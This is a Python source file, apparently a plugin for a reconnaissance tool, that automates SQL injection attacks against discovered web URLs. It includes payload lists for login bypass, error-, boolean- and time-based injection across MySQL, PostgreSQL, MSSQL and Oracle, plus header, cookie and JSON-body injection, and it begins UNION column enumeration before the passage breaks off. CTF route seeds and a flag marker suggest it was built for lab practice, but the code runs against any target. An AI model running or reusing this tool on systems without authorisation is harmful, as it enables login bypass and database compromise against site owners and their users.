# recon_tool/plugins/sqli_analyzer.py
"""
SQLi Analyzer (run-all-and-aggregate)
-------------------------------------

Consumes artifacts from dir_brute_forcer (if present):
- web/paths.json             : discovered URLs
- web/forms.json             : parsed forms (action/method/inputs/score/is_login_guess)
- web/param_seeds.json       : suggested numeric/string params per-URL/origin
- web/header_targets.json    : suggested header/cookie sink URLs and names (optional)

Techniques (executed in order; login pages get login_bypass first):
- login_bypass_boolean  (form-aware; preserves MySQL '-- ' whitespace)
- param_error_based
- param_boolean_based
- param_time_based
- header_injection (X-Forwarded-For, User-Agent, X-Real-IP, X-Api-Version)
- cookie_injection (TrackingId/session/id/token by default + discovered)
- json_xml_body (login-like forms with POST)
- union_enumeration (ORDER BY discovery + marker rotation)
- second_order_probe (placeholder)

Outputs in the session directory:
- sqli_findings.json  (list of successful SQLITestResult dicts)
- sqli_attempts.json  (list of attempt rows: what was tried and outcome)
"""

from __future__ import annotations

import json
import random
import re
import string
import time
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import aiohttp

from recon_tool.core import BasePlugin, ScanContext


@dataclass
class SQLITestResult:
    url: str
    parameter: str                   # param/header/cookie/json-field/path
    vector: str                      # the exact payload
    injection_type: str              # get|post|header|cookie|json|xml|login_bypass|union|second_order
    vulnerable: bool
    evidence: Optional[str] = None   # error snippet / time delta / success marker / login proof
    dbms: Optional[str] = None       # mysql|postgresql|mssql|oracle|unknown
    details: Optional[Dict[str, Any]] = None


class SQLiAnalyzerPlugin(BasePlugin):
    name = "SQLiAnalyzer"
    description = "Run-all-and-aggregate SQL injection testing"
    priority = 40

    # Technique order; login_bypass is bumped to the top on login pages automatically
    TECHNIQUES: List[str] = [
        "param_error_based",
        "param_boolean_based",
        "param_time_based",
        "header_injection",
        "cookie_injection",
        "json_xml_body",
        "union_enumeration",
        "second_order_probe",
    ]

    # Boolean/login bypass playbook (ensure space after -- for MySQL)
    LOGIN_BYPASS_PAYLOADS: List[str] = [
        "' OR 1=1-- -",
        "' OR 1=1-- ",
        "' OR 1=1--+",
        "' OR 1=1--%20",
        "' OR '1'='1'-- ",
        "admin'-- ",
        "') OR ('1'='1'-- ",
        "\") OR (\"1\"=\"1\"-- ",
        "' OR 1=1#",
        "' OR 1=1/*",
    ]

    # Generic boolean payloads (for non-login params)
    BOOLEAN_PAYLOADS: List[str] = [
        "' OR 1=1-- ",
        "' OR '1'='1'-- ",
        "1 OR 1=1",
        "1) OR (1=1",
        "') OR ('1'='1'-- ",
        "')) OR (('1'='1'-- ",
    ]

    # Error signatures for quick wins and DBMS fingerprinting
    ERROR_PATTERNS = {
        "mysql": [
            r"SQL syntax.*?MySQL",
            r"Warning: mysqli?_.+",
            r"Unknown column",
            r"mysql_fetch",
        ],
        "postgresql": [
            r"PostgreSQL.*?ERROR",
            r"unterminated quoted string at or near",
            r"PG::SyntaxError",
        ],
        "mssql": [
            r"Unclosed quotation mark after the character string",
            r"Microsoft SQL Server",
            r"System\.Data\.SqlClient",
        ],
        "oracle": [
            r"ORA-\d{5}",
            r"Oracle error",
        ],
    }

    # DBMS-specific sleep/time payloads
    TIME_PAYLOADS = {
        "mysql": [
            "' OR SLEEP(5)-- ",
            "'; SLEEP(5); -- ",
        ],
        "postgresql": [
            "' OR pg_sleep(5)-- ",
            "')); SELECT pg_sleep(5); -- ",
        ],
        "mssql": [
            "'; WAITFOR DELAY '0:0:5';-- ",
        ],
        "oracle": [
            "'||dbms_pipe.receive_message('a',5)||'",
        ],
        # Fallbacks (try if unknown)
        "generic": [
            "' OR SLEEP(5)-- ",
            "' OR pg_sleep(5)-- ",
            "'; WAITFOR DELAY '0:0:5';-- ",
        ],
    }

    # Headers to try for header-based sinks
    HEADER_NAMES = ["X-Forwarded-For", "User-Agent", "X-Real-IP", "X-Api-Version"]

    # Well-known routes to seed for header/cookie tests (CTFs + real-world)
    HEADER_COOKIE_SEEDS = [
        "/", "/index", "/home",
        "/login", "/register", "/logout",
        "/user", "/users", "/profile", "/account", "/dashboard",
        "/admin", "/admin/login",
        "/post", "/posts", "/article", "/articles", "/blog", "/news",
        "/forum", "/thread", "/topic", "/comments", "/comment",
        "/search", "/items", "/products", "/catalog",
        "/flag", "/ctf", "/score", "/challenges",
        "/about", "/contact",
        "/status", "/health", "/api/status", "/api/health",
        "/terms", "/terms-and-conditions", "/tandc", "/privacy",
        "/robots.txt", "/sitemap.xml",
        "/view", "/page", "/pages",
    ]

    # Numeric-like parameter names commonly seen in CTFs and prod
    NUMERIC_PARAM_CANDIDATES = [
        "id", "pid", "uid", "user_id", "post", "post_id", "article_id", "news_id",
        "story_id", "item", "item_id", "product_id", "cat", "cat_id",
        "tid", "thread_id", "mid", "msg", "message_id",
        "gid", "group_id", "rid", "ref", "ref_id",
        "page", "p", "offset", "limit", "no", "num", "number",
    ]

    DEFAULT_COOKIE_NAMES = ["TrackingId", "session", "id", "token"]

    def __init__(self, context: ScanContext) -> None:
        super().__init__(context)
        self.rate = int(self.context.additional_options.get("rate", 5))
        self.mode = self.context.additional_options.get("sqli_mode", "balanced")
        self.run_all = bool(self.context.additional_options.get("sqli_run_all", True))
        self.max_per_endpoint = int(self.context.additional_options.get("sqli_max_per_endpoint", 12))
        self.confirmations = int(self.context.additional_options.get("sqli_confirmations", 2))
        self.timeout = int(self.context.additional_options.get("sqli_timeout", 10))
        self.oob_domain = self.context.additional_options.get("sqli_oob_domain")

        # Accumulators
        self.findings: List[SQLITestResult] = []
        self.attempts: List[Dict[str, Any]] = []

        # Target-scoped caches (populated in scan_target)
        self._header_cookie_targets: List[str] = []
        self._cookie_names: List[str] = list(self.DEFAULT_COOKIE_NAMES)
        self._forms_by_url: Dict[str, List[Dict[str, Any]]] = {}
        self._param_seeds_by_url: Dict[str, Dict[str, List[str]]] = {}

    # ---------------------------
    # Helpers & heuristics
    # ---------------------------

    def _detect_dbms(self, text: str) -> Optional[str]:
        for dbms, patterns in self.ERROR_PATTERNS.items():
            for pat in patterns:
                if re.search(pat, text, re.IGNORECASE):
                    return dbms
        return None

    def _contains_error(self, text: str) -> bool:
        for pats in self.ERROR_PATTERNS.values():
            for pat in pats:
                if re.search(pat, text, re.IGNORECASE):
                    return True
        return False

    def _login_success(self, before_html: str, after_html: str) -> bool:
        # Password field disappears OR logout/profile/welcome token appears
        had_pw = re.search(r'<input[^>]+type=["\']password["\']', before_html, re.I) is not None
        now_pw = re.search(r'<input[^>]+type=["\']password["\']', after_html, re.I) is not None
        if had_pw and not now_pw:
            return True
        if re.search(r"\blogout\b|\bprofile\b|\bwelcome\b|THM\{", after_html, re.I):
            return True
        return False

    def _rand_ip(self) -> str:
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def _rand_agent(self) -> str:
        token = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
        return f"ReconTool/{token}"

    def _origin(self, some_url: str) -> Optional[str]:
        try:
            p = urlparse(some_url)
            if p.scheme and p.netloc:
                return f"{p.scheme}://{p.netloc}"
        except Exception:
            pass
        return None

    def _seed_header_cookie_targets(self, discovered_urls: List[str]) -> List[str]:
        """Build a diverse list of URLs on this origin to try header/cookie sinks."""
        if not discovered_urls:
            return []
        origins = {self._origin(u) for u in discovered_urls if self._origin(u)}
        seeds: List[str] = []
        for origin in origins:
            for path in self.HEADER_COOKIE_SEEDS:
                seeds.append(urljoin(origin + "/", path.lstrip("/")))
        # Keep discovered URLs themselves too (often important!)
        seeds.extend(discovered_urls)
        # De-dup while preserving order
        seen, uniq = set(), []
        for s in seeds:
            if s not in seen:
                seen.add(s)
                uniq.append(s)
        return uniq

    def _merge_param_keys(self, url: str, include_numeric: bool = True, include_string: bool = True) -> List[str]:
        """Return union of real query keys + seeds (numeric/string) for this URL."""
        keys: List[str] = []
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        keys.extend(list(params.keys()))
        seeds = self._param_seeds_by_url.get(url, {})
        if include_numeric:
            keys.extend(seeds.get("numeric", []))
            keys.extend(self.NUMERIC_PARAM_CANDIDATES)
        if include_string:
            keys.extend(seeds.get("string", []))
        # de-dup preserve order
        seen, uniq = set(), []
        for k in keys:
            if k and k not in seen:
                seen.add(k)
                uniq.append(k)
        return uniq

    def _forms_for_url(self, url: str) -> List[Dict[str, Any]]:
        return self._forms_by_url.get(url, [])

    def _login_field_pairs(self, inputs: List[str]) -> List[Tuple[str, str]]:
        """Return sensible (user_field, pass_field) pairs based on input names."""
        u_candidates = [x for x in inputs if re.search(r"user|uname|login|email", x, re.I)]
        p_candidates = [x for x in inputs if re.search(r"pass|pwd", x, re.I)]
        pairs: List[Tuple[str, str]] = []
        for u in (u_candidates or ["username"]):
            for p in (p_candidates or ["password"]):
                if u != p:
                    pairs.append((u, p))
        # ensure at least one default
        if not pairs:
            pairs.append(("username", "password"))
        return pairs

    # ---------------------------
    # Orchestration
    # ---------------------------

    async def scan_target(self, target: str, out_dir: Path) -> None:
        web_dir = out_dir / "web"
        paths_file = web_dir / "paths.json"
        if not paths_file.exists():
            return

        # Load artifacts (gracefully if missing)
        try:
            with open(paths_file, "r", encoding="utf-8") as f:
                paths = json.load(f)
        except Exception:
            paths = []

        discovered_urls: List[str] = [p.get("url") for p in paths if isinstance(p, dict) and p.get("url")]

        # forms.json
        forms_path = web_dir / "forms.json"
        if forms_path.exists():
            try:
                with open(forms_path, "r", encoding="utf-8") as f:
                    forms_list = json.load(f)
                # Normalize action to absolute URL & index by page URL
                for fd in forms_list:
                    page = fd.get("url") or fd.get("page_url") or ""
                    action = fd.get("action") or page
                    method = (fd.get("method") or "GET").upper()
                    inputs = [i.get("name") for i in fd.get("inputs", []) if i.get("name")]
                    is_login_guess = bool(fd.get("is_login_guess"))
                    # determine origin to absolutize action
                    origin = self._origin(page) or ""
                    try:
                        abs_action = urljoin(origin + "/", action)
                    except Exception:
                        abs_action = action
                    item = {
                        "page_url": page,
                        "action_url": abs_action,
                        "method": method,
                        "inputs": inputs,
                        "is_login_guess": is_login_guess,
                    }
                    self._forms_by_url.setdefault(page, []).append(item)
            except Exception:
                self._forms_by_url = {}

        # param_seeds.json
        param_seeds_path = web_dir / "param_seeds.json"
        if param_seeds_path.exists():
            try:
                with open(param_seeds_path, "r", encoding="utf-8") as f:
                    seeds = json.load(f)
                if isinstance(seeds, list):
                    # list of entries: {"url":..., "numeric":[...], "string":[...]}
                    for entry in seeds:
                        u = entry.get("url")
                        if not u:
                            continue
                        self._param_seeds_by_url[u] = {
                            "numeric": list(set(entry.get("numeric", []))),
                            "string": list(set(entry.get("string", []))),
                        }
                elif isinstance(seeds, dict):
                    self._param_seeds_by_url = seeds  # assume proper structure
            except Exception:
                self._param_seeds_by_url = {}

        # header_targets.json
        header_targets = []
        cookies_from_artifacts: List[str] = []
        header_targets_path = web_dir / "header_targets.json"
        if header_targets_path.exists():
            try:
                with open(header_targets_path, "r", encoding="utf-8") as f:
                    ht = json.load(f)
                urls = ht.get("urls") or ht.get("targets") or []
                if isinstance(urls, list):
                    header_targets.extend([u for u in urls if isinstance(u, str)])
                hnames = ht.get("headers") or []
                if isinstance(hnames, list) and hnames:
                    # extend but keep our default list primarily
                    for h in hnames:
                        if isinstance(h, str) and h not in self.HEADER_NAMES:
                            self.HEADER_NAMES.append(h)
                cnames = ht.get("cookies") or ht.get("cookie_names") or []
                if isinstance(cnames, list):
                    cookies_from_artifacts = [c for c in cnames if isinstance(c, str)]
            except Exception:
                pass

        # Merge cookie names
        for c in cookies_from_artifacts:
            if c not in self._cookie_names:
                self._cookie_names.append(c)

        # Build candidate endpoints and flags
        candidates: List[Dict[str, Any]] = []
        for url in discovered_urls:
            is_login = False
            if "/login" in url:
                is_login = True
            # boost with form hint
            for fd in self._forms_for_url(url):
                if fd.get("is_login_guess"):
                    is_login = True
            candidates.append({"url": url, "is_login": is_login})

        if not candidates:
            return

        # Seed header/cookie targets (mix of enumerated + common)
        self._header_cookie_targets = list(dict.fromkeys(header_targets + self._seed_header_cookie_targets(discovered_urls)))  # de-dup, preserve order

        # Ordered techniques; bump login bypass to the front on login pages
        base_techs = list(self.TECHNIQUES)

        async with aiohttp.ClientSession() as session:
            for cand in candidates:
                url = cand["url"]
                is_login = cand["is_login"]
                techniques = base_techs[:]
                if is_login:
                    techniques = ["login_bypass_boolean"] + techniques

                for tech in techniques:
                    runner = getattr(self, f"_run_{tech}", None)
                    if not runner:
                        continue
                    try:
                        res, attempts = await runner(url, session, is_login=is_login)
                        self.findings.extend(res)
                        self.attempts.extend(attempts)
                    except Exception as e:
                        self.attempts.append({
                            "url": url,
                            "parameter": "",
                            "payload": "",
                            "technique": tech,
                            "success": False,
                            "notes": f"exception: {e}",
                        })

        # Write outputs
        if self.findings:
            with open(out_dir / "sqli_findings.json", "w", encoding="utf-8") as f:
                json.dump([asdict(r) for r in self.findings], f, indent=2)
        with open(out_dir / "sqli_attempts.json", "w", encoding="utf-8") as f:
            json.dump(self.attempts, f, indent=2)

        self.log(
            f"SQL injection tests completed: {len(self.findings)} findings, {len(self.attempts)} attempts",
            out_dir,
            level="INFO",
        )

    # ---------------------------
    # Technique runners
    # ---------------------------

    async def _run_login_bypass_boolean(
        self, url: str, session: aiohttp.ClientSession, is_login: bool = False
    ) -> Tuple[List[SQLITestResult], List[Dict[str, Any]]]:
        results: List[SQLITestResult] = []
        attempts: List[Dict[str, Any]] = []
        if not is_login:
            return results, attempts

        # Determine actionable POST endpoints: form actions (if any) + raw URL fallback
        targets: List[Tuple[str, List[str]]] = []  # (action_url, input_names)
        forms = self._forms_for_url(url)
        if forms:
            for fd in forms:
                if fd.get("method", "GET").upper() == "POST":
                    targets.append((fd.get("action_url", url), fd.get("inputs", [])))
        if not targets:
            targets.append((url, ["username", "password"]))  # fallback

        # For each target form/action, try payloads across plausible username/password fields
        for action_url, inputs in targets:
            # GET baseline page content where the form lives (use page URL when available)
            page_url = url
            try:
                async with session.get(page_url, timeout=self.timeout, allow_redirects=True) as resp:
                    before_html = await resp.text(errors="ignore")
            except Exception as e:
                attempts.append({"url": action_url, "parameter": "username", "payload": "(baseline GET failed)", "technique": "login_bypass_boolean", "success": False, "notes": f"{e}"})
                continue

            for payload in self.LOGIN_BYPASS_PAYLOADS:
                for (uf, pf) in self._login_field_pairs(inputs):
                    combos = [
                        {uf: payload, pf: "x"},
                        {uf: "x", pf: payload},
                        {uf: payload, pf: payload},
                    ]
                    for combo in combos:
                        try:
                            async with session.post(action_url, data=combo, timeout=self.timeout, allow_redirects=True) as resp:
                                after_html = await resp.text(errors="ignore")
                                redirected = bool(resp.history)
                                success = redirected or self._login_success(before_html, after_html)
                                attempts.append({
                                    "url": action_url,
                                    "parameter": f"{uf}/{pf}",
                                    "payload": payload,
                                    "technique": "login_bypass_boolean",
                                    "success": bool(success),
                                    "notes": "redirect or form disappeared" if success else "",
                                })
                                if success:
                                    results.append(SQLITestResult(
                                        url=action_url,
                                        parameter=f"{uf}/{pf}",
                                        vector=payload,
                                        injection_type="login_bypass",
                                        vulnerable=True,
                                        evidence="login bypass (redirect/cookie/form-disappeared)",
                                        dbms=None,
                                    ))
                        except Exception as e:
                            attempts.append({
                                "url": action_url, "parameter": f"{uf}/{pf}", "payload": payload,
                                "technique": "login_bypass_boolean", "success": False, "notes": f"{e}"
                            })

        return results, attempts

    async def _run_param_error_based(
        self, url: str, session: aiohttp.ClientSession, is_login: bool = False
    ) -> Tuple[List[SQLITestResult], List[Dict[str, Any]]]:
        results: List[SQLITestResult] = []
        attempts: List[Dict[str, Any]] = []

        parsed = urlparse(url)
        base_qs = dict(parse_qsl(parsed.query))
        param_keys = self._merge_param_keys(url, include_numeric=True, include_string=True)
        if not param_keys:
            return results, attempts

        # Baseline page
        try:
            async with session.get(url, timeout=self.timeout) as resp:
                base_text = await resp.text(errors="ignore")
        except Exception as e:
            attempts.append({"url": url, "parameter": "", "payload": "(baseline GET failed)", "technique": "param_error_based", "success": False, "notes": f"{e}"})
            return results, attempts

        # Error payloads
        error_payloads = [
            "'", "\"", "')", "\"))", "'-- ", "\"-- ", "')-- ", "\")-- ",
            "' OR 'a'='a", "\" OR \"a\"=\"a",
        ]

        for key in param_keys:
            for payload in error_payloads[: self.max_per_endpoint]:
                new_qs = dict(base_qs)
                new_qs[key] = payload
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(new_qs, doseq=True), parsed.fragment))
                try:
                    async with session.get(test_url, timeout=self.timeout) as resp:
                        text = await resp.text(errors="ignore")
                        has_err = self._contains_error(text) and not self._contains_error(base_text)
                        attempts.append({
                            "url": test_url, "parameter": key, "payload": payload,
                            "technique": "param_error_based", "success": bool(has_err),
                            "notes": "SQL error pattern" if has_err else ""
                        })
                        if has_err:
                            dbms = self._detect_dbms(text)
                            results.append(SQLITestResult(
                                url=test_url, parameter=key, vector=payload,
                                injection_type="get", vulnerable=True,
                                evidence="error signature", dbms=dbms
                            ))
                except Exception as e:
                    attempts.append({
                        "url": test_url, "parameter": key, "payload": payload,
                        "technique": "param_error_based", "success": False, "notes": f"{e}"
                    })

        return results, attempts

    async def _run_param_boolean_based(
        self, url: str, session: aiohttp.ClientSession, is_login: bool = False
    ) -> Tuple[List[SQLITestResult], List[Dict[str, Any]]]:
        results: List[SQLITestResult] = []
        attempts: List[Dict[str, Any]] = []

        parsed = urlparse(url)
        base_qs = dict(parse_qsl(parsed.query))
        param_keys = self._merge_param_keys(url, include_numeric=True, include_string=True)
        if not param_keys:
            return results, attempts

        # Baseline
        try:
            async with session.get(url, timeout=self.timeout) as resp:
                base_text = await resp.text(errors="ignore")
                base_len = len(base_text)
                base_code = resp.status
        except Exception as e:
            attempts.append({"url": url, "parameter": "", "payload": "(baseline GET failed)", "technique": "param_boolean_based", "success": False, "notes": f"{e}"})
            return results, attempts

        for key in param_keys:
            for payload in self.BOOLEAN_PAYLOADS[: self.max_per_endpoint]:
                new_qs = dict(base_qs)
                new_qs[key] = payload
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(new_qs, doseq=True), parsed.fragment))
                try:
                    async with session.get(test_url, timeout=self.timeout) as resp:
                        text = await resp.text(errors="ignore")
                        code_flip = resp.status != base_code
                        len_flip = abs(len(text) - base_len) > 50
                        marker_flip = bool(re.search(r"\b(error|invalid|incorrect)\b", base_text, re.I)) and not re.search(r"\b(error|invalid|incorrect)\b", text, re.I)
                        success = code_flip or len_flip or marker_flip
                        attempts.append({
                            "url": test_url, "parameter": key, "payload": payload,
                            "technique": "param_boolean_based", "success": bool(success),
                            "notes": "code/length/marker flip" if success else ""
                        })
                        if success:
                            results.append(SQLITestResult(
                                url=test_url, parameter=key, vector=payload,
                                injection_type="get", vulnerable=True,
                                evidence="boolean diff", dbms=None
                            ))
                except Exception as e:
                    attempts.append({
                        "url": test_url, "parameter": key, "payload": payload,
                        "technique": "param_boolean_based", "success": False, "notes": f"{e}"
                    })

        return results, attempts

    async def _run_param_time_based(
        self, url: str, session: aiohttp.ClientSession, is_login: bool = False
    ) -> Tuple[List[SQLITestResult], List[Dict[str, Any]]]:
        results: List[SQLITestResult] = []
        attempts: List[Dict[str, Any]] = []

        parsed = urlparse(url)
        base_qs = dict(parse_qsl(parsed.query))
        param_keys = self._merge_param_keys(url, include_numeric=True, include_string=True)
        if not param_keys:
            return results, attempts

        # Baseline timing
        try:
            t0 = time.perf_counter()
            async with session.get(url, timeout=self.timeout) as resp:
                _ = await resp.text(errors="ignore")
            base = time.perf_counter() - t0
        except Exception as e:
            attempts.append({"url": url, "parameter": "", "payload": "(baseline time failed)", "technique": "param_time_based", "success": False, "notes": f"{e}"})
            return results, attempts

        families = ["generic", "mysql", "postgresql", "mssql", "oracle"]
        for key in param_keys:
            for fam in families:
                for payload in self.TIME_PAYLOADS.get(fam, [])[: max(1, self.confirmations)]:
                    new_qs = dict(base_qs)
                    new_qs[key] = payload
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(new_qs, doseq=True), parsed.fragment))
                    try:
                        t0 = time.perf_counter()
                        async with session.get(test_url, timeout=self.timeout + 5) as resp:
                            _ = await resp.text(errors="ignore")
                        dt = time.perf_counter() - t0
                        success = dt > base + 3.5  # conservative for 5s sleeps
                        attempts.append({
                            "url": test_url, "parameter": key, "payload": payload,
                            "technique": "param_time_based", "success": bool(success),
                            "notes": f"Δt={dt:.2f}s (base {base:.2f}s)"
                        })
                        if success:
                            results.append(SQLITestResult(
                                url=test_url, parameter=key, vector=payload,
                                injection_type="get", vulnerable=True,
                                evidence=f"response delayed by {dt:.2f}s", dbms=None
                            ))
                    except Exception as e:
                        attempts.append({
                            "url": test_url, "parameter": key, "payload": payload,
                            "technique": "param_time_based", "success": False, "notes": f"{e}"
                        })

        return results, attempts

    async def _run_header_injection(
        self, _url: str, session: aiohttp.ClientSession, is_login: bool = False
    ) -> Tuple[List[SQLITestResult], List[Dict[str, Any]]]:
        """Probe a set of seeded pages for header-based sinks."""
        results: List[SQLITestResult] = []
        attempts: List[Dict[str, Any]] = []

        # Build payloads
        generic_error_payloads = ["'", "\"", "'-- ", "\"-- "]
        time_payloads = self.TIME_PAYLOADS.get("generic", []) + self.TIME_PAYLOADS.get("mysql", [])

        # Keep target count reasonable (prefer enumerated URLs first)
        targets = self._header_cookie_targets[: max(12, len(self._header_cookie_targets))]

        for url in targets:
            # Baseline text and timing for this page
            try:
                async with session.get(url, timeout=self.timeout) as resp:
                    base_text = await resp.text(errors="ignore")
                t0 = time.perf_counter()
                async with session.get(url, timeout=self.timeout) as resp:
                    _ = await resp.text(errors="ignore")
                base_time = time.perf_counter() - t0
            except Exception as e:
                attempts.append({"url": url, "parameter": "", "payload": "(baseline failed)", "technique": "header_injection", "success": False, "notes": f"{e}"})
                continue

            for header in self.HEADER_NAMES:
                # error-based
                for p in generic_error_payloads[: min(4, self.max_per_endpoint)]:
                    hdrs = {header: (self._rand_ip() if header in ("X-Forwarded-For", "X-Real-IP") else self._rand_agent()) + p}
                    try:
                        async with session.get(url, headers=hdrs, timeout=self.timeout) as resp:
                            text = await resp.text(errors="ignore")
                            hit = self._contains_error(text) and not self._contains_error(base_text)
                            attempts.append({"url": url, "parameter": header, "payload": p, "technique": "header_injection", "success": bool(hit), "notes": "error pattern" if hit else ""})
                            if hit:
                                dbms = self._detect_dbms(text)
                                results.append(SQLITestResult(url=url, parameter=header, vector=p, injection_type="header", vulnerable=True, evidence="error signature", dbms=dbms))
                    except Exception as e:
                        attempts.append({"url": url, "parameter": header, "payload": p, "technique": "header_injection", "success": False, "notes": f"{e}"})

                # time-based
                for p in time_payloads[: max(1, self.confirmations)]:
                    hdrs = {header: (self._rand_ip() if header in ("X-Forwarded-For", "X-Real-IP") else self._rand_agent()) + p}
                    try:
                        t0 = time.perf_counter()
                        async with session.get(url, headers=hdrs, timeout=self.timeout + 5) as resp:
                            _ = await resp.text(errors="ignore")
                        dt = time.perf_counter() - t0
                        hit = dt > base_time + 3.5
                        attempts.append({"url": url, "parameter": header, "payload": p, "technique": "header_injection", "success": bool(hit), "notes": f"Δt={dt:.2f}s (base {base_time:.2f}s)"})
                        if hit:
                            results.append(SQLITestResult(url=url, parameter=header, vector=p, injection_type="header", vulnerable=True, evidence=f"response delayed by {dt:.2f}s", dbms=None))
                    except Exception as e:
                        attempts.append({"url": url, "parameter": header, "payload": p, "technique": "header_injection", "success": False, "notes": f"{e}"})

        return results, attempts

    async def _run_cookie_injection(
        self, _url: str, session: aiohttp.ClientSession, is_login: bool = False
    ) -> Tuple[List[SQLITestResult], List[Dict[str, Any]]]:
        """Use a TrackingId/session/id/token-style cookie sink across seeded pages."""
        results: List[SQLITestResult] = []
        attempts: List[Dict[str, Any]] = []

        error_payloads = ["'", "\"", "'-- ", "\"-- "]
        time_payloads = self.TIME_PAYLOADS.get("generic", [])

        targets = self._header_cookie_targets[: max(12, len(self._header_cookie_targets))]

        for url in targets:
            # Baseline
            try:
                async with session.get(url, timeout=self.timeout) as resp:
                    base_text = await resp.text(errors="ignore")
                t0 = time.perf_counter()
                async with session.get(url, timeout=self.timeout) as resp:
                    _ = await resp.text(errors="ignore")
                base_time = time.perf_counter() - t0
            except Exception as e:
                attempts.append({"url": url, "parameter": "cookie", "payload": "(baseline failed)", "technique": "cookie_injection", "success": False, "notes": f"{e}"})
                continue

            # Error-based
            for p in error_payloads[: min(4, self.max_per_endpoint)]:
                for cname in self._cookie_names:
                    try:
                        session.cookie_jar.update_cookies({cname: "abc" + p})
                        async with session.get(url, timeout=self.timeout) as resp:
                            text = await resp.text(errors="ignore")
                            hit = self._contains_error(text) and not self._contains_error(base_text)
                            attempts.append({"url": url, "parameter": f"cookie:{cname}", "payload": p, "technique": "cookie_injection", "success": bool(hit), "notes": "error pattern" if hit else ""})
                            if hit:
                                dbms = self._detect_dbms(text)
                                results.append(SQLITestResult(url=url, parameter=f"cookie:{cname}", vector=p, injection_type="cookie", vulnerable=True, evidence="error signature", dbms=dbms))
                    except Exception as e:
                        attempts.append({"url": url, "parameter": f"cookie:{cname}", "payload": p, "technique": "cookie_injection", "success": False, "notes": f"{e}"})

            # Time-based
            for p in time_payloads[: max(1, self.confirmations)]:
                for cname in self._cookie_names:
                    try:
                        session.cookie_jar.update_cookies({cname: "abc" + p})
                        t0 = time.perf_counter()
                        async with session.get(url, timeout=self.timeout + 5) as resp:
                            _ = await resp.text(errors="ignore")
                        dt = time.perf_counter() - t0
                        hit = dt > base_time + 3.5
                        attempts.append({"url": url, "parameter": f"cookie:{cname}", "payload": p, "technique": "cookie_injection", "success": bool(hit), "notes": f"Δt={dt:.2f}s (base {base_time:.2f}s)"})
                        if hit:
                            results.append(SQLITestResult(url=url, parameter=f"cookie:{cname}", vector=p, injection_type="cookie", vulnerable=True, evidence=f"response delayed by {dt:.2f}s", dbms=None))
                    except Exception as e:
                        attempts.append({"url": url, "parameter": f"cookie:{cname}", "payload": p, "technique": "cookie_injection", "success": False, "notes": f"{e}"})

        return results, attempts

    async def _run_json_xml_body(
        self, url: str, session: aiohttp.ClientSession, is_login: bool = False
    ) -> Tuple[List[SQLITestResult], List[Dict[str, Any]]]:
        """Send JSON payloads to login-like forms with POST; uses discovered input names."""
        results: List[SQLITestResult] = []
        attempts: List[Dict[str, Any]] = []

        if not is_login:
            return results, attempts

        forms = [fd for fd in self._forms_for_url(url) if fd.get("method") == "POST"]
        if not forms:
            return results, attempts

        headers = {"Content-Type": "application/json"}

        for fd in forms:
            action = fd.get("action_url", url)
            pairs = self._login_field_pairs(fd.get("inputs", []))
            # Craft bodies with discovered field names
            bodies: List[Dict[str, Any]] = []
            for (uf, pf) in pairs:
                bodies.extend([
                    {uf: "' OR 1=1-- ", pf: "x"},
                    {uf: "x", pf: "' OR 1=1-- "},
                    {uf: "' OR 1=1-- ", pf: "' OR 1=1-- "},
                ])

            for body in bodies[: self.max_per_endpoint]:
                try:
                    async with session.post(action, data=json.dumps(body), headers=headers, timeout=self.timeout, allow_redirects=True) as resp:
                        text = await resp.text(errors="ignore")
                        redirected = bool(resp.history)
                        success = redirected or self._login_success("", text)
                        attempts.append({"url": action, "parameter": "json", "payload": json.dumps(body), "technique": "json_xml_body", "success": bool(success), "notes": "redirect or form disappeared" if success else ""})
                        if success:
                            results.append(SQLITestResult(url=action, parameter="json", vector=json.dumps(body), injection_type="json", vulnerable=True, evidence="login bypass via JSON", dbms=None))
                except Exception as e:
                    attempts.append({"url": action, "parameter": "json", "payload": json.dumps(body), "technique": "json_xml_body", "success": False, "notes": f"{e}"})

        # (XML examples could be added when XML endpoints are detected)
        return results, attempts

    async def _run_union_enumeration(
        self, url: str, session: aiohttp.ClientSession, is_login: bool = False
    ) -> Tuple[List[SQLITestResult], List[Dict[str, Any]]]:
        """
        Basic scaffold: discover column count with ORDER BY, then try UNION SELECT NULL,...,'MARK'
        Runs if URL has numeric params OR we synthesize from common names or param_seeds.
        """
        results: List[SQLITestResult] = []
        attempts: List[Dict[str, Any]] = []

        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))

        # Identify existing numeric params; otherwise synthesize candidates
        numeric_keys = [k for k, v in params.items() if re.fullmatch(r"\d+", (v or ""))]
        synth_mode = False
        if not numeric_keys:
            # include seeded numeric names if any
            seeded = self._param_seeds_by_url.get(url, {}).get("numeric", [])
            for name in (seeded + self.NUMERIC_PARAM_CANDIDATES):
                if name not in params:
                    numeric_keys = [name]
                    synth_mode = True
                    break

        if not numeric_keys:
            return results, attempts

        key = numeric_keys[0]

        # Baseline
        try:
            base_qs = dict(params)
            if synth_mode:
                base_qs[key] = "1"
            base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(base_qs, doseq=True), parsed.fragment))
            async with session.get(base_url, timeout=self.timeout) as resp:
                base_code = resp.status
                base_text = await resp.text(errors="ignore")
        except Exception as e:
            attempts.append({"url": url, "parameter": key, "payload": "(baseline failed)", "technique": "union_enumeration", "success": False, "notes": f"{e}"})
            return results, attempts

        # Discover column count up to 8
        max_cols = 0
        for n in range(1, 9):
            inj = f"1 ORDER BY {n}-- "
            new = dict(base_qs)
            new[key] = inj
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(new, doseq=True), parsed.fragment))
            try:
                async with session.get(test_url, timeout=self.timeout) as resp:
                    txt = await resp.text(errors="ignore")
                    # Heuristic: an error or status flip suggests n too high
                    if resp.status != base_code or "Unknown column" in txt or "order by" in txt.lower():
                        max_cols = n - 1
                        break
                    attempts.append({"url": test_url, "parameter": key, "payload": inj, "technique": "union_enumeration", "success": False, "notes": ""})
            except Exception as e:
